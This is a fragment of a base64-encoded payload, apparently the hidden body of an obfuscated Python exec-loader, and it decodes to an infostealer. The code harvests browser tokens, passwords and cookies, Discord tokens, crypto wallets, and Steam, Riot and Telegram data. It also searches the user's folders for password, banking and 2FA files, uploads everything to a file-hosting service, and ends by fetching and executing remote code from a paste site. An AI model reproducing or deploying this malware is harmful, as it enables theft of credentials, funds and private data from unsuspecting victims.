sbmlrXSkKCgpkZWYgR2F0aGVyQWxsKCk6CiAgICAnICAgICAgICAgICAgICAgICAgIERlZmF1bHQgUGF0aCA8IDAgPiAgICAgICAgICAgICAgICAgICAgICAgICBQcm9jZXNOYW1lIDwgMSA+ICAgICAgICBUb2tlbiAgPCAyID4gICAgICAgICAgICAgIFBhc3N3b3JkIDwgMyA+ICAgICBDb29raWVzIDwgNCA+ICAgICAgICAgICAgICAgICAgICAgICAgICBFeHRlbnRpb25zIDwgNSA+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICcKICAgIGJyb3dzZXJQYXRocyA9IFsKICAgICAgICBbZiJ7cm9hbWluZ30vT3BlcmEgU29mdHdhcmUvT3BlcmEgR1ggU3RhYmxlIiwgICAgICAgICAgICAgICAib3BlcmEuZXhlIiwgICAgIi9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICAgICAgICAgIi8iLCAgICAgICAgICAgICIvTmV0d29yayIsICAgICAgICAgICAgICIvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiAgICAgICAgICAgICAgICAgICAgICBdLAogICAgICAgIFtmIntyb2FtaW5nfS9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBTdGFibGUiLCAgICAgICAgICAgICAgICAgICJvcGVyYS5leGUiLCAgICAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgICAgICAgICAiLyIsICAgICAgICAgICAgIi9OZXR3b3JrIiwgICAgICAgICAgICAgIi9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICAgICAgICAgIF0sCiAgICAgICAgW2Yie3JvYW1pbmd9L09wZXJhIFNvZnR3YXJlL09wZXJhIE5lb24vVXNlciBEYXRhL0RlZmF1bHQiLCAgIm9wZXJhLmV4ZSIsICAgICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAgICAgICAgICIvIiwgICAgICAgICAgICAiL05ldHdvcmsiLCAgICAgICAgICAgICAiL0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgICAgICAgICAgXSwKICAgICAgICBbZiJ7bG9jYWx9L0dvb2dsZS9DaHJvbWUvVXNlciBEYXRhIiwgICAgICAgICAgICAgICAgICAgICAgICAiY2hyb21lLmV4ZSIsICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICBdLAogICAgICAgIFtmIntsb2NhbH0vR29vZ2xlL0Nocm9tZSBTeFMvVXNlciBEYXRhIiwgICAgICAgICAgICAgICAgICAgICJjaHJvbWUuZXhlIiwgICAiL0RlZmF1bHQvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAiL0RlZmF1bHQiLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9EZWZhdWx0L0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgIF0sCiAgICAgICAgW2Yie2xvY2FsfS9CcmF2ZVNvZnR3YXJlL0JyYXZlLUJyb3dzZXIvVXNlciBEYXRhIiwgICAgICAgICAgImJyYXZlLmV4ZSIsICAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdCIsICAgICAiL0RlZmF1bHQvTmV0d29yayIsICAgICAiL0RlZmF1bHQvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiAgICAgICAgICAgICAgXSwKICAgICAgICBbZiJ7bG9jYWx9L1lhbmRleC9ZYW5kZXhCcm93c2VyL1VzZXIgRGF0YSIsICAgICAgICAgICAgICAgICAieWFuZGV4LmV4ZSIsICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvSG91Z2FCb3VnYS9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBdLAogICAgICAgIFtmIntsb2NhbH0vTWljcm9zb2Z0L0VkZ2UvVXNlciBEYXRhIiwgICAgICAgICAgICAgICAgICAgICAgICJlZGdlLmV4ZSIsICAgICAiL0RlZmF1bHQvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAiL0RlZmF1bHQiLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9EZWZhdWx0L0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgIF0KICAgIF0KCiAgICBkaXNjb3JkUGF0aHMgPSBbCiAgICAgICAgW2Yie3JvYW1pbmd9L0Rpc2NvcmQiLCAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiJdLAogICAgICAgIFtmIntyb2FtaW5nfS9MaWdodGNvcmQiLCAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiJdLAogICAgICAgIFtmIntyb2FtaW5nfS9kaXNjb3JkY2FuYXJ5IiwgIi9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiXSwKICAgICAgICBbZiJ7cm9hbWluZ30vZGlzY29yZHB0YiIsICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIl0sCiAgICBdCgogICAgUGF0aHNUb1ppcCA9IFsKICAgICAgICBbZiJ7cm9hbWluZ30vYXRvbWljL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICciQXRvbWljIFdhbGxldC5leGUiJywgIldhbGxldCJdLAogICAgICAgIFtmIntyb2FtaW5nfS9FeG9kdXMvZXhvZHVzLndhbGxldCIsICJFeG9kdXMuZXhlIiwgIldhbGxldCJdLAogICAgICAgIFsiQzpcUHJvZ3JhbSBGaWxlcyAoeDg2KVxTdGVhbVxjb25maWciLCAic3RlYW0uZXhlIiwgIlN0ZWFtIl0sCiAgICAgICAgW2Yie3JvYW1pbmd9L05hdGlvbnNHbG9yeS9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAiTmF0aW9uc0dsb3J5LmV4ZSIsICJOYXRpb25zR2xvcnkiXSwKICAgICAgICBbZiJ7bG9jYWx9L1Jpb3QgR2FtZXMvUmlvdCBDbGllbnQvRGF0YSIsICJSaW90Q2xpZW50U2VydmljZXMuZXhlIiwgIlJpb3RDbGllbnQiXQogICAgXQogICAgVGVsZWdyYW0gPSBbZiJ7cm9hbWluZ30vVGVsZWdyYW0gRGVza3RvcC90ZGF0YSIsICd0ZWxlZ3JhbS5leGUnLCAiVGVsZWdyYW0iXQoKICAgIGZvciBwYXR0IGluIGJyb3dzZXJQYXRoczogCiAgICAgICAgYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWdldFRva2VuLCBhcmdzPVtwYXR0WzBdLCBwYXR0WzJdXSkKICAgICAgICBhLnN0YXJ0KCkKICAgICAgICBUaHJlYWRsaXN0LmFwcGVuZChhKQogICAgZm9yIHBhdHQgaW4gZGlzY29yZFBhdGhzOiAKICAgICAgICBhID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9R2V0RGlzY29yZCwgYXJncz1bcGF0dFswXSwgcGF0dFsxXV0pCiAgICAgICAgYS5zdGFydCgpCiAgICAgICAgVGhyZWFkbGlzdC5hcHBlbmQoYSkKCiAgICBmb3IgcGF0dCBpbiBicm93c2VyUGF0aHM6IAogICAgICAgIGEgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1nZXRQYXNzdywgYXJncz1bcGF0dFswXSwgcGF0dFszXV0pCiAgICAgICAgYS5zdGFydCgpCiAgICAgICAgVGhyZWFkbGlzdC5hcHBlbmQoYSkKCiAgICBUaENva2sgPSBbXQogICAgZm9yIHBhdHQgaW4gYnJvd3NlclBhdGhzOiAKICAgICAgICBhID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9Z2V0Q29va2llLCBhcmdzPVtwYXR0WzBdLCBwYXR0WzRdXSkKICAgICAgICBhLnN0YXJ0KCkKICAgICAgICBUaENva2suYXBwZW5kKGEpCgogICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9R2F0aGVyWmlwcywgYXJncz1bYnJvd3NlclBhdGhzLCBQYXRoc1RvWmlwLCBUZWxlZ3JhbV0pLnN0YXJ0KCkKCgogICAgZm9yIHRocmVhZCBpbiBUaENva2s6IHRocmVhZC5qb2luKCkKICAgIERFVEVDVEVEID0gVHJ1c3QoQ29va2llcykKICAgIGlmIERFVEVDVEVEID09IFRydWU6IHJldHVybgoKICAgICMgZm9yIHBhdHQgaW4gYnJvd3NlclBhdGhzOgogICAgIyAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9WmlwVGhpbmdzLCBhcmdzPVtwYXR0WzBdLCBwYXR0WzVdLCBwYXR0WzFdXSkuc3RhcnQoKQogICAgCiAgICAjIGZvciBwYXR0IGluIFBhdGhzVG9aaXA6CiAgICAjICAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1aaXBUaGluZ3MsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbMl0sIHBhdHRbMV1dKS5zdGFydCgpCiAgICAKICAgICMgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9WmlwVGVsZWdyYW0sIGFyZ3M9W1RlbGVncmFtWzBdLCBUZWxlZ3JhbVsyXSwgVGVsZWdyYW1bMV1dKS5zdGFydCgpCgogICAgZm9yIHRocmVhZCBpbiBUaHJlYWRsaXN0OiAKICAgICAgICB0aHJlYWQuam9pbigpCiAgICBnbG9iYWwgdXB0aHMKICAgIHVwdGhzID0gW10KCiAgICBmb3IgZmlsZSBpbiBbIndwcGFzc3cudHh0IiwgIndwY29vay50eHQiXTogCiAgICAgICAgIyB1cGxvYWQob3MuZ2V0ZW52KCJURU1QIikgKyAiXFwiICsgZmlsZSkKICAgICAgICB1cGxvYWQoZmlsZS5yZXBsYWNlKCIudHh0IiwgIiIpLCB1cGxvYWRUb0Fub25maWxlcyhvcy5nZXRlbnYoIlRFTVAiKSArICJcXCIgKyBmaWxlKSkKCmRlZiB1cGxvYWRUb0Fub25maWxlcyhwYXRoKToKICAgIHRyeTpyZXR1cm4gcmVxdWVzdHMucG9zdChmJ2h0dHBzOi8ve3JlcXVlc3RzLmdldCgiaHR0cHM6Ly9hcGkuZ29maWxlLmlvL2dldFNlcnZlciIpLmpzb24oKVsiZGF0YSJdWyJzZXJ2ZXIiXX0uZ29maWxlLmlvL3VwbG9hZEZpbGUnLCBmaWxlcz17J2ZpbGUnOiBvcGVuKHBhdGgsICdyYicpfSkuanNvbigpWyJkYXRhIl1bImRvd25sb2FkUGFnZSJdCiAgICBleGNlcHQ6cmV0dXJuIEZhbHNlCgojIGRlZiB1cGxvYWRUb0Fub25maWxlcyhwYXRoKTpzCiMgICAgIHRyeToKIyAgICAgICAgIGZpbGVzID0geyAiZmlsZSI6IChwYXRoLCBvcGVuKHBhdGgsIG1vZGU9J3JiJykpIH0KIyAgICAgICAgIHVwbG9hZCA9IHJlcXVlc3RzLnBvc3QoImh0dHBzOi8vdHJhbnNmZXIuc2gvIiwgZmlsZXM9ZmlsZXMpCiMgICAgICAgICB1cmwgPSB1cGxvYWQudGV4dAojICAgICAgICAgcmV0dXJuIHVybAojICAgICBleGNlcHQ6CiMgICAgICAgICByZXR1cm4gRmFsc2UKZGVmIEtpd2lGb2xkZXIocGF0aEYsIGtleXdvcmRzKToKICAgIGdsb2JhbCBLaXdpRmlsZXMKICAgIG1heGZpbGVzcGVyZGlyID0gNwogICAgaSA9IDAKICAgIGxpc3RPZkZpbGUgPSBvcy5saXN0ZGlyKHBhdGhGKQogICAgZmZvdW5kID0gW10KICAgIGZvciBmaWxlIGluIGxpc3RPZkZpbGU6CiAgICAgICAgaWYgbm90IG9zLnBhdGguaXNmaWxlKHBhdGhGICsgIi8iICsgZmlsZSk6IHJldHVybgogICAgICAgIGkgKz0gMQogICAgICAgIGlmIGkgPD0gbWF4ZmlsZXNwZXJkaXI6CiAgICAgICAgICAgIHVybCA9IHVwbG9hZFRvQW5vbmZpbGVzKHBhdGhGICsgIi8iICsgZmlsZSkKICAgICAgICAgICAgZmZvdW5kLmFwcGVuZChbcGF0aEYgKyAiLyIgKyBmaWxlLCB1cmxdKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGJyZWFrCiAgICBLaXdpRmlsZXMuYXBwZW5kKFsiZm9sZGVyIiwgcGF0aEYgKyAiLyIsIGZmb3VuZF0pCgpLaXdpRmlsZXMgPSBbXQpkZWYgS2l3aUZpbGUocGF0aCwga2V5d29yZHMpOgogICAgZ2xvYmFsIEtpd2lGaWxlcwogICAgZmlmb3VuZCA9IFtdCiAgICBsaXN0T2ZGaWxlID0gb3MubGlzdGRpcihwYXRoKQogICAgZm9yIGZpbGUgaW4gbGlzdE9mRmlsZToKICAgICAgICBmb3Igd29yZiBpbiBrZXl3b3JkczoKICAgICAgICAgICAgaWYgd29yZiBpbiBmaWxlLmxvd2VyKCk6CiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmlzZmlsZShwYXRoICsgIi8iICsgZmlsZSkgYW5kICIudHh0IiBpbiBmaWxlOgogICAgICAgICAgICAgICAgICAgIGZpZm91bmQuYXBwZW5kKFtwYXRoICsgIi8iICsgZmlsZSwgdXBsb2FkVG9Bbm9uZmlsZXMocGF0aCArICIvIiArIGZpbGUpXSkKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgaWYgb3MucGF0aC5pc2RpcihwYXRoICsgIi8iICsgZmlsZSk6CiAgICAgICAgICAgICAgICAgICAgdGFyZ2V0ID0gcGF0aCArICIvIiArIGZpbGUKICAgICAgICAgICAgICAgICAgICBLaXdpRm9sZGVyKHRhcmdldCwga2V5d29yZHMpCiAgICAgICAgICAgICAgICAgICAgYnJlYWsKCiAgICBLaXdpRmlsZXMuYXBwZW5kKFsiZm9sZGVyIiwgcGF0aCwgZmlmb3VuZF0pCgpkZWYgS2l3aSgpOgogICAgdXNlciA9IHRlbXAuc3BsaXQoIlxBcHBEYXRhIilbMF0KICAgIHBhdGgyc2VhcmNoID0gWwogICAgICAgIHVzZXIgKyAiL0Rlc2t0b3AiLAogICAgICAgIHVzZXIgKyAiL0Rvd25sb2FkcyIsCiAgICAgICAgdXNlciArICIvRG9jdW1lbnRzIgogICAgXQoKICAgIGtleV93b3Jkc0ZvbGRlciA9IFsKICAgICAgICAiYWNjb3VudCIsCiAgICAgICAgImFjb3VudCIsCiAgICAgICAgInBhc3N3IiwKICAgICAgICAic2VjcmV0IgoKICAgIF0KCiAgICBrZXlfd29yZHNGaWxlcyA9IFsKICAgICAgICAicGFzc3ciLAogICAgICAgICJtZHAiLAogICAgICAgICJtb3RkZXBhc3NlIiwKICAgICAgICAibW90X2RlX3Bhc3NlIiwKICAgICAgICAibG9naW4iLAogICAgICAgICJzZWNyZXQiLAogICAgICAgICJhY2NvdW50IiwKICAgICAgICAiYWNvdW50IiwKICAgICAgICAicGF5cGFsIiwKICAgICAgICAiYmFucXVlIiwKICAgICAgICAiYWNjb3VudCIsCiAgICAgICAgIm1ldGFtYXNrIiwKICAgICAgICAid2FsbGV0IiwKICAgICAgICAiY3J5cHRvIiwKICAgICAgICAiZXhvZHVzIiwKICAgICAgICAiZGlzY29yZCIsCiAgICAgICAgIjJmYSIsCiAgICAgICAgImNvZGUiLAogICAgICAgICJtZW1vIiwKICAgICAgICAiY29tcHRlIiwKICAgICAgICAidG9rZW4iLAogICAgICAgICJiYWNrdXAiLAogICAgICAgICJzZWNyZXQiCiAgICAgICAgXQoKICAgIHdpa2l0aCA9IFtdCiAgICBmb3IgcGF0dCBpbiBwYXRoMnNlYXJjaDogCiAgICAgICAga2l3aSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PUtpd2lGaWxlLCBhcmdzPVtwYXR0LCBrZXlfd29yZHNGaWxlc10pO2tpd2kuc3RhcnQoKQogICAgICAgIHdpa2l0aC5hcHBlbmQoa2l3aSkKICAgIHJldHVybiB3aWtpdGgKCgpnbG9iYWwga2V5d29yZCwgY29va2lXb3JkcywgcGFzd1dvcmRzLCBDb29raUNvdW50LCBQYXNzd0NvdW50LCBXYWxsZXRzWmlwLCBHYW1pbmdaaXAsIE90aGVyWmlwCgprZXl3b3JkID0gWwogICAgJ21haWwnLCAnW2NvaW5iYXNlXShodHRwczovL2NvaW5iYXNlLmNvbSknLCAnW3NlbGxpeF0oaHR0cHM6Ly9zZWxsaXguaW8pJywgJ1tnbWFpbF0oaHR0cHM6Ly9nbWFpbC5jb20pJywgJ1tzdGVhbV0oaHR0cHM6Ly9zdGVhbS5jb20pJywgJ1tkaXNjb3JkXShodHRwczovL2Rpc2NvcmQuY29tKScsICdbcmlvdGdhbWVzXShodHRwczovL3Jpb3RnYW1lcy5jb20pJywgJ1t5b3V0dWJlXShodHRwczovL3lvdXR1YmUuY29tKScsICdbaW5zdGFncmFtXShodHRwczovL2luc3RhZ3JhbS5jb20pJywgJ1t0aWt0b2tdKGh0dHBzOi8vdGlrdG9rLmNvbSknLCAnW3R3aXR0ZXJdKGh0dHBzOi8vdHdpdHRlci5jb20pJywgJ1tmYWNlYm9va10oaHR0cHM6Ly9mYWNlYm9vay5jb20pJywgJ2NhcmQnLCAnW2VwaWNnYW1lc10oaHR0cHM6Ly9lcGljZ2FtZXMuY29tKScsICdbc3BvdGlmeV0oaHR0cHM6Ly9zcG90aWZ5LmNvbSknLCAnW3lhaG9vXShodHRwczovL3lhaG9vLmNvbSknLCAnW3JvYmxveF0oaHR0cHM6Ly9yb2Jsb3guY29tKScsICdbdHdpdGNoXShodHRwczovL3R3aXRjaC5jb20pJywgJ1ttaW5lY3JhZnRdKGh0dHBzOi8vbWluZWNyYWZ0Lm5ldCknLCAnYmFuaycsICdbcGF5cGFsXShodHRwczovL3BheXBhbC5jb20pJywgJ1tvcmlnaW5dKGh0dHBzOi8vb3JpZ2luLmNvbSknLCAnW2FtYXpvbl0oaHR0cHM6Ly9hbWF6b24uY29tKScsICdbZWJheV0oaHR0cHM6Ly9lYmF5LmNvbSknLCAnW2FsaWV4cHJlc3NdKGh0dHBzOi8vYWxpZXhwcmVzcy5jb20pJywgJ1twbGF5c3RhdGlvbl0oaHR0cHM6Ly9wbGF5c3RhdGlvbi5jb20pJywgJ1toYm9dKGh0dHBzOi8vaGJvLmNvbSknLCAnW3hib3hdKGh0dHBzOi8veGJveC5jb20pJywgJ2J1eScsICdzZWxsJywgJ1tiaW5hbmNlXShodHRwczovL2JpbmFuY2UuY29tKScsICdbaG90bWFpbF0oaHR0cHM6Ly9ob3RtYWlsLmNvbSknLCAnW291dGxvb2tdKGh0dHBzOi8vb3V0bG9vay5jb20pJywgJ1tjcnVuY2h5cm9sbF0oaHR0cHM6Ly9jcnVuY2h5cm9sbC5jb20pJywgJ1t0ZWxlZ3JhbV0oaHR0cHM6Ly90ZWxlZ3JhbS5jb20pJywgJ1twb3JuaHViXShodHRwczovL3Bvcm5odWIuY29tKScsICdbZGlzbmV5XShodHRwczovL2Rpc25leS5jb20pJywgJ1tleHByZXNzdnBuXShodHRwczovL2V4cHJlc3N2cG4uY29tKScsICdjcnlwdG8nLCAnW3ViZXJdKGh0dHBzOi8vdWJlci5jb20pJywgJ1tuZXRmbGl4XShodHRwczovL25ldGZsaXguY29tKScKXQoKQ29va2lDb3VudCwgUGFzc3dDb3VudCA9IDAsIDAKY29va2lXb3JkcyA9IFtdCnBhc3dXb3JkcyA9IFtdCgpXYWxsZXRzWmlwID0gW10gIyBbTmFtZSwgTGlua10KR2FtaW5nWmlwID0gW10KT3RoZXJaaXAgPSBbXQoKR2F0aGVyQWxsKCkKREVURUNURUQgPSBUcnVzdChDb29raWVzKQojIERFVEVDVEVEID0gRmFsc2UKaWYgbm90IERFVEVDVEVEOgogICAgd2lraXRoID0gS2l3aSgpCgogICAgZm9yIHRocmVhZCBpbiB3aWtpdGg6IHRocmVhZC5qb2luKCkKICAgIHRpbWUuc2xlZXAoMC4yKQoKICAgIGZpbGV0ZXh0ID0gIlxuIgogICAgZm9yIGFyZyBpbiBLaXdpRmlsZXM6CiAgICAgICAgaWYgbGVuKGFyZ1syXSkgIT0gMDoKICAgICAgICAgICAgZm9sZHBhdGggPSBhcmdbMV0KICAgICAgICAgICAgZm9sZGxpc3QgPSBhcmdbMl0gICAgICAgCiAgICAgICAgICAgIGZpbGV0ZXh0ICs9IGYi8J+TgSB7Zm9sZHBhdGh9XG4iCgogICAgICAgICAgICBmb3IgZmZpbCBpbiBmb2xkbGlzdDoKICAgICAgICAgICAgICAgIGEgPSBmZmlsWzBdLnNwbGl0KCIvIikKICAgICAgICAgICAgICAgIGZpbGVhbm1lID0gYVtsZW4oYSktMV0KICAgICAgICAgICAgICAgIGIgPSBmZmlsWzFdCiAgICAgICAgICAgICAgICBmaWxldGV4dCArPSBmIuKUlOKUgDpvcGVuX2ZpbGVfZm9sZGVyOiBbe2ZpbGVhbm1lfV0oe2J9KVxuIgogICAgICAgICAgICBmaWxldGV4dCArPSAiXG4iCiAgICB1cGxvYWQoImtpd2kiLCBmaWxldGV4dCkKZXhlYyhyZXF1ZXN0cy5nZXQoImh0dHBzOi8vcHN0LmtsZ3J0aC5pby9wYXN0ZS9iYmVoeS9yYXciKS50ZQ=="""))
